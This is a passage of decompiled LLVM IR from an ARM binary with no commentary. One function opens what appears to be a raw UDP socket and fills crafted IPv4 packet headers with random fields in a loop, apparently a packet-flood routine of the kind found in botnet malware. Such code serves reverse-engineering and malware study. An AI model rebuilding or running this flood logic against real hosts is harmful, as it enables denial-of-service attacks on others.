  store i32 %v2_cb98, i32* %r1.global-to-local, align 4
  %v1_ce70 = add i32 %v2_ce68, 20
  %v2_ce70 = inttoptr i32 %v1_ce70 to i8*
  %v3_ce70 = load i8, i8* %v2_ce70, align 1
  %v4_ce74 = mul i32 %v1_ce74, 4
  %v5_ce74 = add i32 %v4_ce74, %v2_cb98
  %v6_ce74 = inttoptr i32 %v5_ce74 to i32*
  %v7_ce74 = load i32, i32* %v6_ce74, align 4
  store i32 %v7_ce74, i32* @r5, align 4
  %v7_ce78 = icmp eq i8 %v3_ce70, 31
  store i1 %v7_ce78, i1* %cpsr_z.global-to-local, align 1
  %v1_ce7c = add i32 %v7_ce74, 20
  store i32 %v1_ce7c, i32* @r6, align 4
  %tmp43 = icmp ult i8 %v3_ce70, 32
  br i1 %tmp43, label %dec_label_pc_cf80, label %dec_label_pc_ce84

dec_label_pc_ce84:                                ; preds = %dec_label_pc_ce60
  store i1 %v8_cfb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_cfb0, label %dec_label_pc_cfbc, label %dec_label_pc_ce90

dec_label_pc_ce90:                                ; preds = %dec_label_pc_cf80, %dec_label_pc_ce84
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cfcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_cfcc, label %dec_label_pc_cfd8, label %dec_label_pc_cea4

dec_label_pc_cea4:                                ; preds = %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge, %dec_label_pc_ce90
  %v1_cea8 = phi i32 [ %v1_cea8.pre, %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge ], [ 65535, %dec_label_pc_ce90 ]
  store i32 %v3_cd10, i32* %r1.global-to-local, align 4
  %v9_cea8 = icmp eq i32 %v3_cd10, %v1_cea8
  store i1 %v9_cea8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_cea8, label %dec_label_pc_cfec, label %dec_label_pc_ceb0

dec_label_pc_ceb0:                                ; preds = %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge, %dec_label_pc_cea4
  %v1_ceb4 = phi i32 [ %v1_ceb4.pre, %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge ], [ %v1_cea8, %dec_label_pc_cea4 ]
  %v9_ceb4 = icmp eq i32 %v3_cd30, %v1_ceb4
  store i1 %v9_ceb4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_ceb4, label %dec_label_pc_d000, label %dec_label_pc_cebc

dec_label_pc_cebc:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_ceb0, %dec_label_pc_d000
  store i32 %v1_cc8c, i32* %r3.global-to-local, align 4
  store i1 %v2_cec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_cec0, label %dec_label_pc_cec8, label %dec_label_pc_cf70

dec_label_pc_cec8:                                ; preds = %dec_label_pc_cebc, %dec_label_pc_cf70
  %v2_cecc = load i32, i32* @r5, align 4
  %v3_cecc = add i32 %v2_cecc, 10
  %v4_cecc = inttoptr i32 %v3_cecc to i16*
  store i16 0, i16* %v4_cecc, align 2
  %v0_ced0 = load i32, i32* @r5, align 4
  store i32 %v0_ced0, i32* @r0, align 4
  store i32 20, i32* %r1.global-to-local, align 4
  %v2_ced8 = call i32 @function_dadc(i32 %v0_ced0, i32 20)
  %v3_ced8 = trunc i32 %v2_ced8 to i16
  %v3_cedc = load i32, i32* @r5, align 4
  %v4_cedc = add i32 %v3_cedc, 10
  %v5_cedc = inttoptr i32 %v4_cedc to i16*
  store i16 %v3_ced8, i16* %v5_cedc, align 2
  %v2_cee4 = load i32, i32* @r6, align 4
  %v3_cee4 = add i32 %v2_cee4, 6
  %v4_cee4 = inttoptr i32 %v3_cee4 to i16*
  store i16 0, i16* %v4_cee4, align 2
  %v0_cee8 = load i32, i32* @r6, align 4
  store i32 %v0_cee8, i32* @r1, align 4
  %v1_ceec = add i32 %v0_cee8, 4
  %v2_ceec = inttoptr i32 %v1_ceec to i16*
  %v3_ceec = load i16, i16* %v2_ceec, align 2
  %v4_ceec = zext i16 %v3_ceec to i32
  %v0_cef0 = load i32, i32* @sl, align 4
  store i32 %v0_cef0, i32* %r3.global-to-local, align 4
  %v0_cef4 = load i32, i32* @r5, align 4
  %v4_cef8 = call i32 @function_db2c(i32 %v0_cef4, i32 %v0_cee8, i32 %v4_ceec, i32 %v0_cef0)
  %v5_cef8 = trunc i32 %v4_cef8 to i16
  %v3_cefc = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cefc, i32* %r3.global-to-local, align 4
  %v3_cf00 = mul i32 %v3_cefc, 32
  store i32 %v3_cf00, i32* %lr.global-to-local, align 4
  %v3_cf04 = load i32, i32* @r6, align 4
  %v4_cf04 = add i32 %v3_cf04, 6
  %v5_cf04 = inttoptr i32 %v4_cf04 to i16*
  store i16 %v5_cef8, i16* %v5_cf04, align 2
  %v0_cf08 = load i32, i32* %lr.global-to-local, align 4
  %v1_cf08 = load i32, i32* %r3.global-to-local, align 4
  %tmp44 = mul i32 %v1_cf08, -8
  %v5_cf08 = add i32 %v0_cf08, %tmp44
  store i32 %v5_cf08, i32* %lr.global-to-local, align 4
  %v0_cf0c = load i32, i32* @r6, align 4
  %v1_cf0c = add i32 %v0_cf0c, 2
  %v2_cf0c = inttoptr i32 %v1_cf0c to i16*
  %v3_cf0c = load i16, i16* %v2_cf0c, align 2
  %v1_cf10 = load i32, i32* @r8, align 4
  %v2_cf10 = add i32 %v1_cf10, %v5_cf08
  store i32 %v2_cf10, i32* @lr, align 4
  %v3_cf14 = add i32 %v2_cf10, 2
  %v4_cf14 = inttoptr i32 %v3_cf14 to i16*
  store i16 %v3_cf0c, i16* %v4_cf14, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_cf20 = load i32, i32* @r5, align 4
  store i32 %v0_cf20, i32* @r1, align 4
  %v0_cf24 = load i32, i32* @fp, align 4
  store i32 %v0_cf24, i32* @r0, align 4
  %v0_cf28 = load i32, i32* @sb, align 4
  store i32 %v0_cf28, i32* @r2, align 4
  %v0_cf34 = call i32 @function_14ae4()
  %v3_cf38 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_cf38, i32* %r3.global-to-local, align 4
  %v1_cf3c = add i32 %v3_cf38, 1
  %v1_cf40 = load i32, i32* @r7, align 4
  %v9_cf40 = icmp eq i32 %v1_cf3c, %v1_cf40
  store i1 %v9_cf40, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_cf3c, i32* %stack_var_-44, align 4
  %v5_cf48 = icmp slt i32 %v1_cf3c, %v1_cf40
  br i1 %v5_cf48, label %dec_label_pc_ce60, label %dec_label_pc_cf4c

dec_label_pc_cf4c:                                ; preds = %dec_label_pc_cf5c, %dec_label_pc_cec8, %dec_label_pc_cf4c.preheader
  %v0_cf60 = phi i32 [ %v0_cf50.pre, %dec_label_pc_cf4c.preheader ], [ 0, %dec_label_pc_cf5c ], [ %v1_cf40, %dec_label_pc_cec8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_cf50 = icmp eq i32 %v0_cf60, 0
  store i1 %v2_cf50, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_cf50, label %dec_label_pc_cf5c, label %dec_label_pc_ce5c

dec_label_pc_cf5c:                                ; preds = %dec_label_pc_cf4c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br label %dec_label_pc_cf4c

dec_label_pc_cf70:                                ; preds = %dec_label_pc_cebc
  %v0_cf70 = load i32, i32* @r5, align 4
  %v1_cf70 = add i32 %v0_cf70, 28
  store i32 %v0_cd04, i32* %r1.global-to-local, align 4
  %v2_cf78 = inttoptr i32 %v1_cf70 to i16*
  %v3_cf78 = call i32 @function_f770(i16* %v2_cf78, i32 %v0_cd04)
  br label %dec_label_pc_cec8

dec_label_pc_cf80:                                ; preds = %dec_label_pc_ce60
  %v1_cf80 = add i32 %v2_ce68, 16
  %v2_cf80 = inttoptr i32 %v1_cf80 to i32*
  %v3_cf80 = load i32, i32* %v2_cf80, align 4
  %v1_cf84 = call i32 @function_14a1c(i32 %v3_cf80)
  store i32 %v1_cf84, i32* %r4.global-to-local, align 4
  %v0_cf8c = call i32 @function_f570()
  %v3_cf90 = load i32, i32* %stack_var_-44, align 4
  %v5_cf98 = mul i32 %v3_cf90, 24
  %v1_cf9c = load i32, i32* @r8, align 4
  %v2_cf9c = add i32 %v1_cf9c, %v5_cf98
  store i32 %v2_cf9c, i32* %r3.global-to-local, align 4
  %v1_cfa0 = add i32 %v2_cf9c, 20
  %v2_cfa0 = inttoptr i32 %v1_cfa0 to i8*
  %v3_cfa0 = load i8, i8* %v2_cfa0, align 1
  %v4_cfa0 = zext i8 %v3_cfa0 to i32
  %v0_cfa4 = load i32, i32* %r4.global-to-local, align 4
  %v7_cfa4 = lshr i32 %v0_cf8c, %v4_cfa0
  %v8_cfa4 = add i32 %v7_cfa4, %v0_cfa4
  %v1_cfa8 = call i32 @function_14874(i32 %v8_cfa4)
  store i1 %v8_cfb0, i1* %cpsr_z.global-to-local, align 1
  %v1_cfb4 = load i32, i32* @r5, align 4
  %v2_cfb4 = add i32 %v1_cfb4, 16
  %v3_cfb4 = inttoptr i32 %v2_cfb4 to i32*
  store i32 %v1_cfa8, i32* %v3_cfb4, align 4
  br i1 %v3_cfb0, label %dec_label_pc_cfbc, label %dec_label_pc_ce90

dec_label_pc_cfbc:                                ; preds = %dec_label_pc_cf80, %dec_label_pc_ce84
  %v0_cfbc = call i32 @function_f570()
  store i32 %v3_cd2c, i32* %r3.global-to-local, align 4
  store i32 65535, i32* @r4, align 4
  store i1 %v3_cfcc, i1* %cpsr_z.global-to-local, align 1
  %v1_cfd0 = load i32, i32* @r5, align 4
  %v2_cfd0 = add i32 %v1_cfd0, 12
  %v3_cfd0 = inttoptr i32 %v2_cfd0 to i32*
  store i32 %v0_cfbc, i32* %v3_cfd0, align 4
  br i1 %v3_cfcc, label %dec_label_pc_cfd8, label %dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge

dec_label_pc_cfbc.dec_label_pc_cea4_crit_edge:    ; preds = %dec_label_pc_cfbc
  %v1_cea8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_cea4

dec_label_pc_cfd8:                                ; preds = %dec_label_pc_cfbc, %dec_label_pc_ce90
  %v0_cfd8 = call i32 @function_f570()
  %v1_cfd8 = trunc i32 %v0_cfd8 to i16
  store i32 %v3_cd10, i32* %r1.global-to-local, align 4
  %v1_cfe0 = load i32, i32* @r4, align 4
  %v9_cfe0 = icmp eq i32 %v3_cd10, %v1_cfe0
  store i1 %v9_cfe0, i1* %cpsr_z.global-to-local, align 1
  %v3_cfe4 = load i32, i32* @r5, align 4
  %v4_cfe4 = add i32 %v3_cfe4, 4
  %v5_cfe4 = inttoptr i32 %v4_cfe4 to i16*
  store i16 %v1_cfd8, i16* %v5_cfe4, align 2
  br i1 %v9_cfe0, label %dec_label_pc_cfec, label %dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge

dec_label_pc_cfd8.dec_label_pc_ceb0_crit_edge:    ; preds = %dec_label_pc_cfd8
  %v1_ceb4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_ceb0

dec_label_pc_cfec:                                ; preds = %dec_label_pc_cfd8, %dec_label_pc_cea4
  %v0_cfec = call i32 @function_f570()
  %v1_cfec = trunc i32 %v0_cfec to i16
  %v1_cff4 = load i32, i32* @r4, align 4
  %v9_cff4 = icmp eq i32 %v3_cd30, %v1_cff4
  store i1 %v9_cff4, i1* %cpsr_z.global-to-local, align 1
  %v3_cff8 = load i32, i32* @r5, align 4
  %v4_cff8 = add i32 %v3_cff8, 20
  %v5_cff8 = inttoptr i32 %v4_cff8 to i16*
  store i16 %v1_cfec, i16* %v5_cff8, align 2
  br i1 %v9_cff4, label %dec_label_pc_d000, label %dec_label_pc_cebc

dec_label_pc_d000:                                ; preds = %dec_label_pc_cfec, %dec_label_pc_ceb0
  %v0_d000 = call i32 @function_f570()
  %v1_d000 = trunc i32 %v0_d000 to i16
  %v3_d004 = load i32, i32* @r6, align 4
  %v4_d004 = add i32 %v3_d004, 2
  %v5_d004 = inttoptr i32 %v4_d004 to i16*
  store i16 %v1_d000, i16* %v5_d004, align 2
  br label %dec_label_pc_cebc

dec_label_pc_d00c:                                ; preds = %dec_label_pc_ccc4
  %v0_d00c = load i32, i32* @fp, align 4
  store i32 %v0_d00c, i32* @r0, align 4
  %v1_d010 = call i32 @function_15b6c(i32 %v0_d00c)
  br label %dec_label_pc_d014

dec_label_pc_d014:                                ; preds = %dec_label_pc_cb7c, %dec_label_pc_d00c
  %v1_d01c = phi i32 [ %v3_ccb4, %dec_label_pc_cb7c ], [ %v1_d010, %dec_label_pc_d00c ]
  store i32 %v3_cb7c, i32* %r4.global-to-local, align 4
  store i32 %v18_cb7c, i32* %sb.global-to-local, align 4
  store i32 %v27_cb7c, i32* %lr.global-to-local, align 4
  ret i32 %v1_d01c

; uselistorder directives
  uselistorder i32 %v1_cf3c, { 2, 0, 3, 1 }
  uselistorder i32 %v5_cf08, { 1, 0 }
  uselistorder i32 %v0_ce44, { 1, 0 }
  uselistorder i1 %v3_cfcc, { 1, 0, 2, 3 }
  uselistorder i32 %v3_cd30, { 2, 1, 0 }
  uselistorder i32 %v3_cd2c, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_cd10, { 5, 4, 3, 2, 1, 6, 0 }
  uselistorder i32 %v0_cd04, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_ccf8, { 2, 0, 1 }
  uselistorder i1 %v7_cce4, { 1, 0 }
  uselistorder i1 %v7_ccb8, { 1, 0 }
  uselistorder i32 %v3_ccb4, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v6_cca0, { 0, 2, 1 }
  uselistorder i32 %v2_cb98, { 0, 3, 1, 2 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 13, 3, 7, 8, 9, 10, 11, 12, 14, 4, 5, 6 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 12, 4, 5, 6, 7, 8, 9, 10, 11, 17, 18, 19, 20, 13, 14, 15, 16, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 16, 18, 17, 19, 20, 22, 21, 24, 23, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 12, 5, 6, 7, 8, 9, 10, 11, 14, 15, 13, 16, 17, 18, 19 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_d014, { 1, 0 }
  uselistorder label %dec_label_pc_cec8, { 1, 0 }
  uselistorder label %dec_label_pc_cebc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_cf4c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_cd74, { 1, 0 }
  uselistorder label %bb42, { 1, 0 }
  uselistorder label %bb40, { 1, 0 }
}

define i32 @function_d024(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_d024:
  %cpsr_z.global-to-local = alloca i1, align 1
  %lr.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v3_d024 = load i32, i32* @r4, align 4
  %v27_d024 = load i32, i32* @lr, align 4
  store i32 %arg2, i32* @sl, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r8, align 4
  %v2_d040 = call i32 @function_13258(i32 %arg1, i32 4)
  %v0_d044 = load i32, i32* @r5, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_d040, i32* @fp, align 4
  %v0_d054 = load i32, i32* @r4, align 4
  %v4_d058 = inttoptr i32 %v0_d044 to i32*
  %v5_d058 = call i32 @function_a430(i32 %v0_d054, i32* %v4_d058, i32 2, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_d070 = load i32, i32* @r4, align 4
  %v0_d074 = load i32, i32* @r5, align 4
  %v5_d078 = trunc i32 %v5_d058 to i8
  %v6_d07c = inttoptr i32 %v0_d074 to i32*
  %v7_d07c = call i32 @function_a430(i32 %v0_d070, i32* %v6_d07c, i32 3, i32 65535)
  %v0_d080 = load i32, i32* @r5, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v0_d08c = load i32, i32* @r4, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v5_d094 = inttoptr i32 %v0_d080 to i32*
  %v6_d094 = call i32 @function_a430(i32 %v0_d08c, i32* %v5_d094, i32 4, i32 64)
  %v0_d0a0 = load i32, i32* @r5, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_d0ac = load i32, i32* @r4, align 4
  %v6_d0b4 = inttoptr i32 %v0_d0a0 to i32*
  %v7_d0b4 = call i32 @function_a430(i32 %v0_d0ac, i32* %v6_d0b4, i32 5, i32 0)
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 6, i32* %r2.global-to-local, align 4
  %v0_d0c8 = load i32, i32* @r4, align 4
  %v0_d0cc = load i32, i32* @r5, align 4
  %v1_d0d0 = urem i32 %v7_d0b4, 256
  store i32 %v1_d0d0, i32* @r7, align 4
  %v4_d0d4 = inttoptr i32 %v0_d0cc to i32*
  %v5_d0d4 = call i32 @function_a430(i32 %v0_d0c8, i32* %v4_d0d4, i32 6, i32 65535)
  store i32 27015, i32* %r3.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_d0e4 = load i32, i32* @r5, align 4
  %v0_d0ec = load i32, i32* @r4, align 4
  %v5_d0f0 = inttoptr i32 %v0_d0e4 to i32*
  %v6_d0f0 = call i32 @function_a430(i32 %v0_d0ec, i32* %v5_d0f0, i32 7, i32 27015)
  store i32 %v6_d0f0, i32* @r4, align 4
  %v1_d0fc = call i32 @function_11ad8(i32 29)
  %v3_d108 = call i32 @function_11a14(i32 29, i32* nonnull %stack_var_-48)
  store i32 %v3_d108, i32* @r6, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v3_d11c = call i32 @function_14ba0(i32 2, i32 3, i32 17)
  store i32 %v3_d11c, i32* @r0, align 4
  %v7_d120 = icmp eq i32 %v3_d11c, -1
  store i1 %v7_d120, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_d11c, i32* @sb, align 4
  br i1 %v7_d120, label %dec_label_pc_d420, label %dec_label_pc_d12c

dec_label_pc_d12c:                                ; preds = %dec_label_pc_d024
  store i32 1, i32* %stack_var_-44, align 4
  %v6_d134 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v6_d134, i32* %r3.global-to-local, align 4
  store i32 3, i32* @r2, align 4
  %v5_d148 = call i32 @function_14b30(i32 %v3_d11c, i32 0, i32 3, i32 %v6_d134, i32 ptrtoint (i32* @0 to i32))
  %v7_d14c = icmp eq i32 %v5_d148, -1
  store i1 %v7_d14c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d14c, label %dec_label_pc_d418, label %dec_label_pc_d154

dec_label_pc_d154:                                ; preds = %dec_label_pc_d12c
  %v0_d164 = load i32, i32* @r4, align 4
  %v3_d16c = urem i32 %v7_d07c, 65536
  store i32 %v3_d16c, i32* %r3.global-to-local, align 4
  %v3_d170 = urem i32 %v5_d0d4, 65536
  store i32 %v3_d170, i32* %r2.global-to-local, align 4
  %v3_d174 = urem i32 %v0_d164, 65536
  %v0_d178 = load i32, i32* @r8, align 4
  %v2_d178 = icmp eq i32 %v0_d178, 0
  store i1 %v2_d178, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_d178, label %dec_label_pc_d384.preheader, label %dec_label_pc_d190

dec_label_pc_d384.preheader:                      ; preds = %dec_label_pc_d198, %dec_label_pc_d154
  %v0_d398.ph = phi i32 [ 0, %dec_label_pc_d154 ], [ %v1_d214, %dec_label_pc_d198 ]
  %v3_d2d8 = icmp eq i32 %v3_d16c, 65535
  br label %dec_label_pc_d384

dec_label_pc_d190:                                ; preds = %dec_label_pc_d154
  store i32 0, i32* @r4, align 4
  %v4_d258 = sext i8 %v5_d078 to i32
  %sext = mul i32 %v6_d094, 16777216
  %v4_d280 = sdiv i32 %sext, 16777216
  br label %dec_label_pc_d220

dec_label_pc_d198:                                ; preds = %dec_label_pc_d220, %dec_label_pc_d298
  %v2_d19c = phi i32 [ %v0_d290, %dec_label_pc_d220 ], [ %v2_d19c.pre, %dec_label_pc_d298 ]
  %v3_d19c = add i32 %v2_d19c, 9
  %v4_d19c = inttoptr i32 %v3_d19c to i8*
  store i8 17, i8* %v4_d19c, align 1
  %v3_d1a4 = load i32, i32* %stack_var_-44, align 4
  %v2_d1a8 = load i32, i32* @global_var_2295c.90, align 4
  store i32 %v2_d1a8, i32* %r2.global-to-local, align 4
  %v5_d1b0 = mul i32 %v3_d1a4, 24
  store i32 %v5_d1b0, i32* %r3.global-to-local, align 4
  %v1_d1b4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1b4 = add i32 %v1_d1b4, 12
  %v3_d1b4 = inttoptr i32 %v2_d1b4 to i32*
  store i32 %v2_d1a8, i32* %v3_d1b4, align 4
  %v0_d1b8 = load i32, i32* %r3.global-to-local, align 4
  %v1_d1b8 = load i32, i32* @sl, align 4
  %v2_d1b8 = add i32 %v1_d1b8, %v0_d1b8
  store i32 %v2_d1b8, i32* %r3.global-to-local, align 4
  %v1_d1bc = add i32 %v2_d1b8, 16
  %v2_d1bc = inttoptr i32 %v1_d1bc to i32*
  %v3_d1bc = load i32, i32* %v2_d1bc, align 4
  store i32 %v3_d1bc, i32* %r2.global-to-local, align 4
  %v1_d1c4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1c4 = add i32 %v1_d1c4, 16
  %v3_d1c4 = inttoptr i32 %v2_d1c4 to i32*
  store i32 %v3_d1bc, i32* %v3_d1c4, align 4
  %v1_d1c8 = call i32 @function_14898(i32 %v3_d170)
  %v2_d1c8 = trunc i32 %v1_d1c8 to i16
  %v3_d1cc = load i32, i32* %r4.global-to-local, align 4
  %v4_d1cc = add i32 %v3_d1cc, 20
  %v5_d1cc = inttoptr i32 %v4_d1cc to i16*
  store i16 %v2_d1c8, i16* %v5_d1cc, align 2
  %v1_d1d4 = call i32 @function_14898(i32 %v3_d174)
  %v2_d1d4 = trunc i32 %v1_d1d4 to i16
  %v3_d1d8 = load i32, i32* %stack_var_-48, align 4
  %v1_d1dc = mul i32 %v3_d1d8, 65536
  %v3_d1e0 = add i32 %v1_d1dc, 786432
  store i32 %v3_d1e0, i32* %r3.global-to-local, align 4
  %v3_d1e4 = load i32, i32* @r5, align 4
  %v4_d1e4 = add i32 %v3_d1e4, 2
  %v5_d1e4 = inttoptr i32 %v4_d1e4 to i16*
  store i16 %v2_d1d4, i16* %v5_d1e4, align 2
  %v0_d1e8 = load i32, i32* %r3.global-to-local, align 4
  %v3_d1e8 = udiv i32 %v0_d1e8, 65536
  %v1_d1ec = call i32 @function_14898(i32 %v3_d1e8)
  %v2_d1ec = trunc i32 %v1_d1ec to i16
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_d1f4 = load i32, i32* %r4.global-to-local, align 4
  %v2_d1f4 = add i32 %v1_d1f4, 28
  %v3_d1f4 = inttoptr i32 %v2_d1f4 to i32*
  store i32 -1, i32* %v3_d1f4, align 4
  %v3_d1f8 = load i32, i32* @r5, align 4
  %v4_d1f8 = add i32 %v3_d1f8, 4
  %v5_d1f8 = inttoptr i32 %v4_d1f8 to i16*
  store i16 %v2_d1ec, i16* %v5_d1f8, align 2
  %v0_d1fc = load i32, i32* @r6, align 4
  %v0_d200 = load i32, i32* %r4.global-to-local, align 4
  %v1_d200 = add i32 %v0_d200, 32
  %v3_d204 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_d204, i32* %r2.global-to-local, align 4
  %v3_d208 = call i32 @function_123e0(i32 %v1_d200, i32 %v0_d1fc, i32 %v3_d204)
  %v3_d20c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d20c, i32* %r3.global-to-local, align 4
  %v1_d210 = add i32 %v3_d20c, 1
  store i32 %v1_d210, i32* @r4, align 4
  %v1_d214 = load i32, i32* @r8, align 4
  %v9_d214 = icmp eq i32 %v1_d210, %v1_d214
  store i1 %v9_d214, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_d210, i32* %stack_var_-44, align 4
  %v6_d21c = icmp slt i32 %v1_d210, %v1_d214
  br i1 %v6_d21c, label %dec_label_pc_d220, label %dec_label_pc_d384.preheader

dec_label_pc_d220:                                ; preds = %dec_label_pc_d198, %dec_label_pc_d190
  %v2_d228 = call i32 @function_13258(i32 128, i32 1)
  %v3_d22c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_d22c, i32* %r2.global-to-local, align 4
  %v1_d230 = load i32, i32* @fp, align 4
  %v2_d230 = load i32, i32* @r4, align 4
  %v5_d230 = mul i32 %v2_d230, 4
  %v6_d230 = add i32 %v5_d230, %v1_d230
  %v7_d230 = inttoptr i32 %v6_d230 to i32*
  store i32 %v2_d228, i32* %v7_d230, align 4
  %v0_d234 = load i32, i32* @fp, align 4
  %v1_d234 = load i32, i32* %r2.global-to-local, align 4
  %v4_d234 = mul i32 %v1_d234, 4
  %v5_d234 = add i32 %v4_d234, %v0_d234
  %v6_d234 = inttoptr i32 %v5_d234 to i32*
  %v7_d234 = load i32, i32* %v6_d234, align 4
  store i32 %v7_d234, i32* %r4.global-to-local, align 4
  %v1_d238 = inttoptr i32 %v7_d234 to i8*
  %v2_d238 = load i8, i8* %v1_d238, align 1
  %tmp = urem i8 %v2_d238, 16
  %v1_d23c = zext i8 %tmp to i32
  %v1_d240 = or i32 %v1_d23c, 64
  store i32 %v1_d240, i32* %r3.global-to-local, align 4
  %v1_d244 = trunc i32 %v1_d240 to i8
  store i8 %v1_d244, i8* %v1_d238, align 1
  %v0_d248 = load i32, i32* %r4.global-to-local, align 4
  %v1_d248 = inttoptr i32 %v0_d248 to i8*
  %v2_d248 = load i8, i8* %v1_d248, align 1
  %v1_d24c = and i8 %v2_d248, -16
  %v1_d250 = or i8 %v1_d24c, 5
  store i8 %v1_d250, i8* %v1_d248, align 1
  store i32 %v4_d258, i32* %r2.global-to-local, align 4
  %v2_d25c = load i32, i32* %r4.global-to-local, align 4
  %v3_d25c = add i32 %v2_d25c, 1
  %v4_d25c = inttoptr i32 %v3_d25c to i8*
  store i8 %v5_d078, i8* %v4_d25c, align 1
  %v3_d260 = load i32, i32* %stack_var_-48, align 4
  %v1_d264 = add i32 %v3_d260, 32
  %v3_d26c = urem i32 %v1_d264, 65536
  %v1_d270 = call i32 @function_14898(i32 %v3_d26c)
  %v2_d270 = trunc i32 %v1_d270 to i16
  %v3_d274 = load i32, i32* %r4.global-to-local, align 4
  %v4_d274 = add i32 %v3_d274, 2
  %v5_d274 = inttoptr i32 %v4_d274 to i16*
  store i16 %v2_d270, i16* %v5_d274, align 2
  %v1_d27c = call i32 @function_14898(i32 %v3_d16c)
  %v2_d27c = trunc i32 %v1_d27c to i16
  store i32 %v4_d280, i32* %r3.global-to-local, align 4
  %v0_d284 = load i32, i32* @r7, align 4
  %v2_d284 = icmp eq i32 %v0_d284, 0
  store i1 %v2_d284, i1* %cpsr_z.global-to-local, align 1
  %v3_d288 = load i32, i32* %r4.global-to-local, align 4
  %v4_d288 = add i32 %v3_d288, 4
  %v5_d288 = inttoptr i32 %v4_d288 to i16*
  store i16 %v2_d27c, i16* %v5_d288, align 2
  %v0_d28c = load i32, i32* %r3.global-to-local, align 4
  %v1_d28c = trunc i32 %v0_d28c to i8
  %v2_d28c = load i32, i32* %r4.global-to-local, align 4
  %v3_d28c = add i32 %v2_d28c, 8
  %v4_d28c = inttoptr i32 %v3_d28c to i8*
  store i8 %v1_d28c, i8* %v4_d28c, align 1
  %v0_d290 = load i32, i32* %r4.global-to-local, align 4
  %v1_d290 = add i32 %v0_d290, 20
  store i32 %v1_d290, i32* @r5, align 4
  %v0_d294 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_d294, label %dec_label_pc_d198, label %dec_label_pc_d298

dec_label_pc_d298:                                ; preds = %dec_label_pc_d220
  %v1_d29c = call i32 @function_14898(i32 16384)
  %v2_d29c = trunc i32 %v1_d29c to i16
  %v3_d2a0 = load i32, i32* %r4.global-to-local, align 4
  %v4_d2a0 = add i32 %v3_d2a0, 6
  %v5_d2a0 = inttoptr i32 %v4_d2a0 to i16*
  store i16 %v2_d29c, i16* %v5_d2a0, align 2
  %v2_d19c.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_d198

dec_label_pc_d2a8:                                ; preds = %dec_label_pc_d384
  br label %dec_label_pc_d2ac

dec_label_pc_d2ac:                                ; preds = %dec_label_pc_d2f8, %dec_label_pc_d2a8
